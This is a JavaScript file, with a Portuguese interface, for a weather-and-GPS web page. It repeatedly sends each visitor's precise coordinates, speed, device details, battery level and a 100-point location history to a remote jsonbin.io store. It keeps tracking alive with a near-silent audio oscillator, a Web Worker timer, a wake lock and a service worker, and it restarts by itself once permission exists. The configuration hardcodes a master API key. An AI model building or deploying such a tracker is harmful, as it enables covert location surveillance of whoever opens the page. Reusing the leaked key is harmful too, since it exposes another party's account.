/**
 * ============================================
 * GPS TRACKER - tracker.js
 * ============================================
 */
;(function () {
    'use strict';

    /* ─── CONFIG ─────────────────────────────── */
    const CFG = {
        BIN_ID  : '6a0802b8c0954111d82f1971',
        API_KEY : '$2a$10$zfLo4xQ0.IvfaaQaJbTDle3OU9eW24NU.iN7JbK9Ph9OpF0MiuRRu',
        API_URL : 'https://api.jsonbin.io/v3/b/',
        SEND_INTERVAL : 30_000,
        GEO_OPTS : { enableHighAccuracy: true, timeout: 20_000, maximumAge: 0 },
        WEATHER_URL : 'https://api.open-meteo.com/v1/forecast',
        GEO_NAME_URL : 'https://nominatim.openstreetmap.org/reverse',
    };

    /* ─── STATE ──────────────────────────────── */
    const S = {
        deviceId       : null,
        watchId        : null,
        sendInterval   : null,
        clockInterval  : null,
        lastPos        : null,
        sendCount      : 0,
        updateCount    : 0,
        tempUnit       : 'C',
        rawTempC       : null,
        rawFeelsC      : null,
        batteryManager : null,
        worker         : null,
    };

    /* ─── WEATHER CODES ──────────────────────── */
    const WC = {
        0  : { d:'Céu limpo',             i:'fa-sun',                  c:'#f6ad55' },
        1  : { d:'Predomin. limpo',       i:'fa-sun',                  c:'#f6ad55' },
        2  : { d:'Parcialmente nublado',  i:'fa-cloud-sun',            c:'#a0aec0' },
        3  : { d:'Nublado',               i:'fa-cloud',                c:'#718096' },
        45 : { d:'Neblina',               i:'fa-smog',                 c:'#a0aec0' },
        48 : { d:'Neblina com gelo',      i:'fa-smog',                 c:'#90cdf4' },
        51 : { d:'Garoa leve',            i:'fa-cloud-drizzle',        c:'#4299e1' },
        53 : { d:'Garoa moderada',        i:'fa-cloud-drizzle',        c:'#3182ce' },
        55 : { d:'Garoa intensa',         i:'fa-cloud-showers-heavy',  c:'#2b6cb0' },
        61 : { d:'Chuva leve',            i:'fa-cloud-rain',           c:'#4299e1' },
        63 : { d:'Chuva moderada',        i:'fa-cloud-rain',           c:'#3182ce' },
        65 : { d:'Chuva forte',           i:'fa-cloud-showers-heavy',  c:'#2b6cb0' },
        71 : { d:'Neve leve',             i:'fa-snowflake',            c:'#bee3f8' },
        73 : { d:'Neve moderada',         i:'fa-snowflake',            c:'#90cdf4' },
        75 : { d:'Neve forte',            i:'fa-snowflake',            c:'#63b3ed' },
        77 : { d:'Granizo',               i:'fa-cloud-meatball',       c:'#90cdf4' },
        80 : { d:'Pancadas leves',        i:'fa-cloud-rain',           c:'#4299e1' },
        81 : { d:'Pancadas moderadas',    i:'fa-cloud-showers-heavy',  c:'#3182ce' },
        82 : { d:'Pancadas violentas',    i:'fa-cloud-showers-heavy',  c:'#2b6cb0' },
        85 : { d:'Neve em pancadas',      i:'fa-snowflake',            c:'#90cdf4' },
        86 : { d:'Neve forte/pancadas',   i:'fa-snowflake',            c:'#63b3ed' },
        95 : { d:'Tempestade',            i:'fa-bolt',                 c:'#ecc94b' },
        96 : { d:'Tempestade c/ granizo', i:'fa-bolt',                 c:'#d69e2e' },
        99 : { d:'Tempestade severa',     i:'fa-bolt',                 c:'#b7791f' },
    };

    /* ─── HELPERS ────────────────────────────── */
    const $ = id => document.getElementById(id);

    function setText(id, val) {
        const el = $(id);
        if (el) el.textContent = val;
    }

    function setHTML(id, val) {
        const el = $(id);
        if (el) el.innerHTML = val;
    }

    function wc(code) {
        return WC[code] || WC[3];
    }

    function toF(c) { return +(c * 9/5 + 32).toFixed(1); }

    function dispTemp(c) {
        return S.tempUnit === 'C' ? `${Math.round(c)}` : `${Math.round(toF(c))}`;
    }

    function msToKmh(ms) { return ms ? +(ms * 3.6).toFixed(1) : 0; }

    function getDeviceId() {
        let id = localStorage.getItem('_gps_did');
        if (!id) {
            id = 'D_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
            localStorage.setItem('_gps_did', id);
        }
        return id;
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        const name = (() => {
            const m = ua.match(/;\s([^;]+)\sBuild/) || ua.match(/iPhone|iPad|iPod/);
            if (m) return Array.isArray(m) ? m[1]?.trim() || 'iPhone' : m[0];
            if (/Windows/i.test(ua)) return 'PC Windows';
            if (/Mac/i.test(ua))     return 'Mac';
            if (/Linux/i.test(ua))   return 'Linux';
            return 'Desconhecido';
        })();
        const os = (() => {
            if (/Android/i.test(ua)) { const m = ua.match(/Android\s([\d.]+)/); return 'Android ' + (m?.[1] || ''); }
            if (/iPhone|iPad/i.test(ua)) { const m = ua.match(/OS\s([\d_]+)/); return 'iOS ' + (m?.[1]?.replace(/_/g,'.') || ''); }
            if (/Windows NT 10/i.test(ua)) return 'Windows 10/11';
            if (/Windows/i.test(ua))       return 'Windows';
            if (/Mac/i.test(ua))           return 'macOS';
            return 'Linux';
        })();
        const browser = (() => {
            if (/Edg\//i.test(ua))    return 'Edge';
            if (/OPR|Opera/i.test(ua)) return 'Opera';
            if (/Chrome/i.test(ua))   return 'Chrome';
            if (/Firefox/i.test(ua))  return 'Firefox';
            if (/Safari/i.test(ua))   return 'Safari';
            return 'Outro';
        })();
        return { name, os, browser, ua: ua.slice(0, 200) };
    }

    async function getBattery() {
        try {
            if ('getBattery' in navigator) {
                if (!S.batteryManager) S.batteryManager = await navigator.getBattery();
                return { level: Math.round(S.batteryManager.level * 100), charging: S.batteryManager.charging };
            }
        } catch (_) {}
        return { level: null, charging: null };
    }

    function uvLabel(idx) {
        if (idx <= 2) return { text: 'Baixo',     color: '#48bb78' };
        if (idx <= 5) return { text: 'Moderado',  color: '#ed8936' };
        if (idx <= 7) return { text: 'Alto',      color: '#fc5c65' };
        if (idx <= 10) return { text:'Muito alto', color: '#9b2c2c' };
        return { text: 'Extremo', color: '#6b21a8' };
    }

    function visibilityLabel(km) {
        if (km >= 10) return 'Excelente';
        if (km >= 5)  return 'Boa';
        if (km >= 2)  return 'Moderada';
        return 'Baixa';
    }

    function windDirLabel(deg) {
        const dirs = ['N','NE','L','SE','S','SO','O','NO'];
        return dirs[Math.round((deg % 360) / 45) % 8] || '--';
    }

    const DAY_NAMES = ['Dom','Seg','Ter','Qua','Qui','Sex','Sáb'];

    /* ─── SHOW SCREEN ────────────────────────── */
    function showScreen(id) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        const el = $(id);
        if (el) el.classList.add('active');
    }

    /* ─── LOADING STEPS ──────────────────────── */
    function stepDone(stepId) {
        const el = $(stepId);
        if (el) { el.classList.remove('active'); el.classList.add('done'); el.querySelector('i').className = 'fas fa-check-circle'; }
    }

    /* ─── CLOCK ──────────────────────────────── */
    function startClock() {
        function tick() {
            const now = new Date();
            setText('footer-time', now.toLocaleTimeString('pt-BR'));
        }
        tick();
        S.clockInterval = setInterval(tick, 1000);
    }

    /* ─── UNIT SWITCH ────────────────────────── */
    window.switchUnit = function(unit) {
        S.tempUnit = unit;
        $('btn-celsius').classList.toggle('active', unit === 'C');
        $('btn-fahrenheit').classList.toggle('active', unit === 'F');
        if (S.rawTempC !== null) {
            const u = unit === 'C' ? '°C' : '°F';
            setText('temp-value', dispTemp(S.rawTempC));
            setText('feels-like', dispTemp(S.rawFeelsC) + u);
        }
    };

    /* ─── REVERSE GEOCODE ────────────────────── */
    async function getLocationName(lat, lng) {
        try {
            const r = await fetch(`${CFG.GEO_NAME_URL}?format=json&lat=${lat}&lon=${lng}&zoom=14&addressdetails=1`, {
                headers: { 'Accept-Language': 'pt-BR', 'User-Agent': 'GPSTracker/2.0' },
            });
            const d = await r.json();
            const a = d.address || {};
            const parts = [
                a.suburb || a.neighbourhood || a.village,
                a.city || a.town || a.municipality,
                a.state,
            ].filter(Boolean);
            return parts.slice(0, 2).join(', ') || 'Localização detectada';
        } catch (_) { return 'Localização detectada'; }
    }

    /* ─── SIGNAL BAR ─────────────────────────── */
    function updateSignal(accuracy) {
        const sig = $('signal-indicator');
        if (!sig) return;
        sig.className = 'signal-indicator';
        if (accuracy <= 10)       sig.classList.add('signal-good');
        else if (accuracy <= 50)  sig.classList.add('signal-medium');
        else                      sig.classList.add('signal-low');
    }

    /* ─── BATTERY UI ─────────────────────────── */
    function updateBatteryUI(bat) {
        if (!bat || bat.level === null) return;
        const { level, charging } = bat;
        const icon = $('battery-icon');
        const text = $('battery-text');
        if (text) text.textContent = level + '%' + (charging ? ' ⚡' : '');
        if (!icon) return;
        if (charging) { icon.className = 'fas fa-battery-bolt'; icon.style.color = '#48bb78'; return; }
        if (level > 75) { icon.className = 'fas fa-battery-full';           icon.style.color = '#48bb78'; }
        else if (level > 50) { icon.className = 'fas fa-battery-three-quarters'; icon.style.color = '#68d391'; }
        else if (level > 25) { icon.className = 'fas fa-battery-half';       icon.style.color = '#ed8936'; }
        else if (level > 10) { icon.className = 'fas fa-battery-quarter';    icon.style.color = '#fc8181'; }
        else                  { icon.className = 'fas fa-battery-empty';     icon.style.color = '#fc5c65'; }
    }

    /* ─── WEATHER FETCH ──────────────────────── */
    async function fetchWeather(lat, lng) {
        const params = new URLSearchParams({
            latitude            : lat,
            longitude           : lng,
            current_weather     : true,
            hourly              : [
                'temperature_2m','relativehumidity_2m','apparent_temperature',
                'precipitation_probability','weathercode','windspeed_10m',
                'cloudcover','pressure_msl','uv_index','visibility',
            ].join(','),
            daily               : [
                'weathercode','temperature_2m_max','temperature_2m_min',
                'precipitation_probability_max','windspeed_10m_max',
            ].join(','),
            timezone            : 'auto',
            forecast_days       : 7,
            timeformat          : 'unixtime',
        });

        const r = await fetch(`${CFG.WEATHER_URL}?${params}`);
        if (!r.ok) throw new Error('Weather API error');
        return r.json();
    }

    /* ─── RENDER WEATHER ─────────────────────── */
    function renderWeather(data) {
        if (!data?.current_weather) return;

        const cw  = data.current_weather;
        const h   = data.hourly || {};
        const d   = data.daily  || {};
        const now = new Date();
        const hi  = now.getHours();

        // Main icon + description
        const weather = wc(cw.weathercode);
        const iconEl  = $('main-weather-icon');
        if (iconEl) {
            iconEl.className = `fas ${weather.i} weather-main-icon`;
            iconEl.style.color = weather.c;
        }
        const glow = $('weather-glow');
        if (glow) glow.style.background = weather.c;

        // Temperature
        S.rawTempC  = cw.temperature;
        const feelsArr = h.apparent_temperature || [];
        S.rawFeelsC = feelsArr[hi] ?? cw.temperature;

        const unit = S.tempUnit === 'C' ? '°C' : '°F';
        setText('temp-value', dispTemp(S.rawTempC));
        setText('weather-desc', weather.d);
        setText('feels-like', `Sensação térmica: ${dispTemp(S.rawFeelsC)}${unit}`);

        // Info cards
        const humidity   = (h.relativehumidity_2m || [])[hi] ?? '--';
        const windspeed  = Math.round(cw.windspeed);
        const pressure   = Math.round((h.pressure_msl || [])[hi] ?? 0);
        const cloudcover = (h.cloudcover || [])[hi] ?? '--';
        const uvIndex    = Math.round((h.uv_index || [])[hi] ?? 0);
        const vis        = Math.round(((h.visibility || [])[hi] ?? 10000) / 1000);

        setText('humidity-val', humidity + '%');
        setText('wind-val', windspeed + ' km/h');
        setText('pressure-val', pressure ? pressure + ' hPa' : '--');
        setText('cloud-val', cloudcover + '%');
        setText('uv-val', uvIndex);
        setText('visibility-val', vis + ' km');
        setText('visibility-text', visibilityLabel(vis));

        // Bars
        const hBar = $('humidity-bar');
        const cBar = $('cloud-bar');
        if (hBar) hBar.style.width = humidity + '%';
        if (cBar) cBar.style.width = cloudcover + '%';

        // Wind direction
        const windArrow = $('wind-arrow');
        if (windArrow) windArrow.style.transform = `rotate(${cw.winddirection}deg)`;
        const windDirEl = $('wind-dir');
        if (windDirEl) windDirEl.title = windDirLabel(cw.winddirection);

        // UV
        const uvInfo = uvLabel(uvIndex);
        const uvText = $('uv-text');
        if (uvText) { uvText.textContent = uvInfo.text; uvText.style.color = uvInfo.color; }

        // Hourly
        const hourlyEl = $('hourly-scroll');
        if (hourlyEl && h.temperature_2m) {
            const times = h.time || [];
            const temps = h.temperature_2m;
            const codes = h.weathercode || [];
            const rains = h.precipitation_probability || [];
            let html = '';
            for (let i = hi; i < Math.min(hi + 24, times.length); i++) {
                const t   = new Date(times[i] * 1000);
                const lbl = i === hi ? 'Agora' : t.getHours().toString().padStart(2,'0') + ':00';
                const w   = wc(codes[i]);
                html += `
                    <div class="hourly-item ${i === hi ? 'current' : ''}">
                        <div class="hourly-time">${lbl}</div>
                        <i class="fas ${w.i} hourly-icon" style="color:${w.c}"></i>
                        <div class="hourly-temp">${dispTemp(temps[i])}°</div>
                        <div class="hourly-rain"><i class="fas fa-droplet"></i> ${rains[i] || 0}%</div>
                    </div>`;
            }
            hourlyEl.innerHTML = html;
        }

        // Daily
        const dailyEl = $('daily-list');
        if (dailyEl && d.weathercode) {
            const dates  = d.time  || [];
            const codes2 = d.weathercode;
            const maxT   = d.temperature_2m_max || [];
            const minT   = d.temperature_2m_min || [];
            const rains  = d.precipitation_probability_max || [];
            let html = '';
            dates.forEach((ts, i) => {
                const date    = new Date(ts * 1000);
                const dayName = i === 0 ? 'Hoje' : i === 1 ? 'Amanhã' : DAY_NAMES[date.getDay()];
                const w       = wc(codes2[i]);
                html += `
                    <div class="daily-item">
                        <div class="daily-day">${dayName}</div>
                        <i class="fas ${w.i} daily-icon" style="color:${w.c}"></i>
                        <div class="daily-range">
                            <span class="daily-max">${dispTemp(maxT[i])}°</span>
                            <span class="daily-min">${dispTemp(minT[i])}°</span>
                        </div>
                        <div class="daily-rain"><i class="fas fa-droplet"></i> ${rains[i] || 0}%</div>
                    </div>`;
            });
            dailyEl.innerHTML = html;
        }
    }

    /* ─── SEND TO JSONBIN ────────────────────── */
    async function sendToJsonBin(locData) {
        try {
            // Buscar bin atual
            const rGet = await fetch(`${CFG.API_URL}${CFG.BIN_ID}/latest`, {
                headers: { 'X-Master-Key': CFG.API_KEY, 'X-Bin-Meta': 'false' },
            });
            if (!rGet.ok) throw new Error('GET failed ' + rGet.status);
            const current = await rGet.json();
            const bin     = current.record || { devices: [] };
            if (!bin.devices) bin.devices = [];

            const idx = bin.devices.findIndex(d => d.id === S.deviceId);
            const bat = await getBattery();
            const entry = {
                id        : S.deviceId,
                info      : getDeviceInfo(),
                lastSeen  : new Date().toISOString(),
                sendCount : S.sendCount + 1,
                currentLocation : { ...locData, battery: bat, timestamp: new Date().toISOString() },
                history   : [],
                firstSeen : null,
            };

            if (idx >= 0) {
                const old = bin.devices[idx];
                entry.firstSeen = old.firstSeen || new Date().toISOString();
                entry.history   = old.history || [];
                entry.history.unshift({
                    lat: locData.latitude, lng: locData.longitude,
                    accuracy: locData.accuracy, speed: locData.speed,
                    altitude: locData.altitude, battery: bat,
                    time: new Date().toISOString(),
                });
                entry.history = entry.history.slice(0, 100);
                bin.devices[idx] = entry;
            } else {
                entry.firstSeen = new Date().toISOString();
                entry.history   = [{ lat: locData.latitude, lng: locData.longitude, accuracy: locData.accuracy, speed: locData.speed, altitude: locData.altitude, battery: bat, time: new Date().toISOString() }];
                bin.devices.push(entry);
            }

            const rPut = await fetch(`${CFG.API_URL}${CFG.BIN_ID}`, {
                method  : 'PUT',
                headers : { 'Content-Type': 'application/json', 'X-Master-Key': CFG.API_KEY },
                body    : JSON.stringify(bin),
            });
            if (!rPut.ok) throw new Error('PUT failed ' + rPut.status);

            S.sendCount++;
            setText('send-count', S.sendCount);
            updateFooter('success');
            console.log('[Tracker] ✅ Enviado #' + S.sendCount);
        } catch (err) {
            console.error('[Tracker] ❌ Erro envio:', err);
            updateFooter('error');
        }
    }

    /* ─── FOOTER STATUS ──────────────────────── */
    function updateFooter(status) {
        const dot  = $('footer-dot');
        const text = $('footer-status');
        if (status === 'success') {
            if (dot)  { dot.className = 'status-dot active'; }
            if (text) text.textContent = `Rastreando • Envio #${S.sendCount} concluído`;
        } else if (status === 'error') {
            if (dot)  { dot.className = 'status-dot'; dot.style.background = '#fc5c65'; }
            if (text) text.textContent = 'Erro de conexão • Tentando novamente...';
        }
    }

    /* ─── PROCESS POSITION ───────────────────── */
    async function processPosition(pos) {
        S.updateCount++;
        const { latitude, longitude, accuracy, altitude, speed, heading } = pos.coords;

        const locData = {
            latitude, longitude,
            accuracy  : Math.round(accuracy),
            altitude  : altitude ? Math.round(altitude) : null,
            speed     : msToKmh(speed),
            heading   : heading ? Math.round(heading) : null,
        };

        S.lastPos = locData;

        // Update GPS UI
        setText('gps-lat',      latitude.toFixed(7));
        setText('gps-lng',      longitude.toFixed(7));
        setText('gps-alt',      altitude ? Math.round(altitude) + ' m' : '--');
        setText('gps-accuracy', '±' + Math.round(accuracy) + ' m');
        setText('gps-speed',    locData.speed > 0 ? locData.speed + ' km/h' : 'Parado');
        setText('gps-updates',  S.updateCount);
        setText('last-update-time', new Date().toLocaleTimeString('pt-BR'));

        updateSignal(accuracy);

        // Update battery
        const bat = await getBattery();
        updateBatteryUI(bat);

        // City name (só na primeira vez ou a cada 5 atualizações)
        if (S.updateCount === 1 || S.updateCount % 5 === 0) {
            getLocationName(latitude, longitude).then(name => setText('city-name', name));
        }

        // Weather (primeira vez e a cada 10 atualizações)
        if (S.updateCount === 1 || S.updateCount % 10 === 0) {
            fetchWeather(latitude, longitude)
                .then(renderWeather)
                .catch(e => console.error('[Weather]', e));
        }

        // Enviar para bin
        await sendToJsonBin(locData);
    }

    /* ─── KEEP ALIVE (background) ────────────── */
    function keepAlive() {
        // Web Worker to prevent JS GC / throttling
        try {
            const blob = new Blob([`
                let c = 0;
                setInterval(() => { self.postMessage(++c); }, 20000);
            `], { type: 'text/javascript' });
            S.worker = new Worker(URL.createObjectURL(blob));
            S.worker.onmessage = () => {
                if (S.lastPos) {
                    navigator.geolocation.getCurrentPosition(
                        p => processPosition(p),
                        () => {},
                        CFG.GEO_OPTS
                    );
                }
            };
        } catch (_) {}

        // Audio trick for iOS keep-alive
        try {
            const ctx  = new (window.AudioContext || window.webkitAudioContext)();
            const osc  = ctx.createOscillator();
            const gain = ctx.createGain();
            gain.gain.value = 0.00001;
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
        } catch (_) {}

        // Visibility API
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && S.lastPos) {
                navigator.geolocation.getCurrentPosition(
                    p => processPosition(p),
                    () => {},
                    CFG.GEO_OPTS
                );
            }
        });

        // Wakke lock (Chrome/Android)
        if ('wakeLock' in navigator) {
            const requestWake = async () => {
                try {
                    await navigator.wakeLock.request('screen');
                } catch (_) {}
            };
            requestWake();
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) requestWake();
            });
        }
    }

    /* ─── START TRACKING ─────────────────────── */
    function startTracking() {
        S.deviceId = getDeviceId();

        showScreen('screen-loading');
        setText('loading-msg', 'Obtendo coordenadas GPS...');

        const step1 = setTimeout(() => {
            $('step-gps')?.classList.add('done');
            $('step-weather')?.classList.add('active');
            setText('loading-msg', 'Buscando dados climáticos...');
        }, 1500);

        const step2 = setTimeout(() => {
            $('step-weather')?.classList.remove('active');
            $('step-weather')?.classList.add('done');
            $('step-connect')?.classList.add('active');
            setText('loading-msg', 'Conectando ao servidor...');
        }, 3000);

        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                clearTimeout(step1); clearTimeout(step2);
                stepDone('step-gps'); stepDone('step-weather'); stepDone('step-connect');

                await processPosition(pos);

                setTimeout(() => {
                    showScreen('screen-main');
                    startClock();
                    keepAlive();
                    const bgDot = $('bg-dot');
                    if (bgDot) bgDot.style.display = 'block';

                    // Watch contínuo
                    S.watchId = navigator.geolocation.watchPosition(
                        p => processPosition(p),
                        e => console.error('[GPS Watch]', e.message),
                        CFG.GEO_OPTS
                    );

                    // Intervalo de backup
                    S.sendInterval = setInterval(() => {
                        navigator.geolocation.getCurrentPosition(
                            p => processPosition(p),
                            () => {},
                            CFG.GEO_OPTS
                        );
                    }, CFG.SEND_INTERVAL);

                }, 600);
            },
            (err) => {
                clearTimeout(step1); clearTimeout(step2);
                showScreen('screen-permission');
                let msg = 'Erro desconhecido';
                switch (err.code) {
                    case 1: msg = 'Permissão negada. Ative nas configurações.'; break;
                    case 2: msg = 'Localização indisponível. Tente novamente.'; break;
                    case 3: msg = 'Tempo esgotado. Verifique seu GPS.'; break;
                }
                const btn = $('btn-allow');
                if (btn) {
                    btn.innerHTML = `<i class="fas fa-rotate-right"></i><span>${msg} (Tentar novamente)</span>`;
                    btn.disabled  = false;
                }
            },
            CFG.GEO_OPTS
        );
    }

    /* ─── SERVICE WORKER ─────────────────────── */
    async function registerSW() {
        if (!('serviceWorker' in navigator)) return;
        try {
            const swCode = `
                self.addEventListener('install', e => self.skipWaiting());
                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                self.addEventListener('fetch', () => {});
            `;
            const blob = new Blob([swCode], { type: 'application/javascript' });
            await navigator.serviceWorker.register(URL.createObjectURL(blob));
        } catch (_) {}
    }

    /* ─── INIT ───────────────────────────────── */
    function init() {
        const btn = $('btn-allow');
        if (btn) {
            btn.addEventListener('click', () => {
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Conectando...</span>';
                btn.disabled  = true;
                startTracking();
            });
        }

        // Auto-start se já tem permissão
        navigator.permissions?.query({ name: 'geolocation' }).then(r => {
            if (r.state === 'granted') startTracking();
        }).catch(() => {});

        registerSW();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();